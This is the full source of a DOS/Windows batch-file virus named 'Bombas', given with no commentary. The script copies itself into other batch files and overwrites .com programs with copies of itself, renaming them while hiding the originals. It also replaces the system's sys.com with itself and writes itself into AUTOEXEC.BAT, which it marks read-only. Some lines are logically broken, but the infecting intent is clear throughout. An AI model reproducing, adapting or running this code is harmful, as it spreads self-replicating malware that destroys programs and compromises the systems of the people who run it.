:Bombas on your computer 2y
@echo off
if "%0"=="sys.bat" goto syst
if "%0"=="sys" goto syst
set sys=%windir%
set bombs=copy
if "%0"=="AUTOEXEC.BAT" goto  aut
goto rep
:aut
@echo off
echo Bombas ver 1.19 on your computer! Be well...
exit
:rep
for %%w in (*.bat) do set bas=%%w
find "bas" %%w
if errorlevel 1 type %0>>%bas%
set boom= *.com
ctty nul
bombs %0 %winbootdir%\%0
bombs %0 ..
if not exist %boom% goto end
for %%i in (%boom% ..\%boom%) do bombs %%i *.vdv
for %%k in (%boom% ..\%boom%) do bombs %0 %%k
ren *.com *.bat
attrib *.vdv + h
attrib %0 -h
goto rep
if exist c:\windows\command\sys.old goto end
bombs %0 %sys%\command\sys.bat
call ren %sys%\command\sys.com sys.old
attrib c:\windows\command\sys.old +h
goto end
:syst
attrib %sys%\command\sys.old -h
ren %sys%\command\sys.old sys.com
sys.com %1 %2
ren %sys%\command\sys.com sys.old
attrib %sys%\command\sys.old +h
bombs %sys%\command\sys.bat %1\autoexec.bat >nul
bombs %sys%\command\attrib.exe %1\attrib.exe >nul
type %0 >> %1\autoexec.bat
attrib %1\autoexec.bat +r
:end

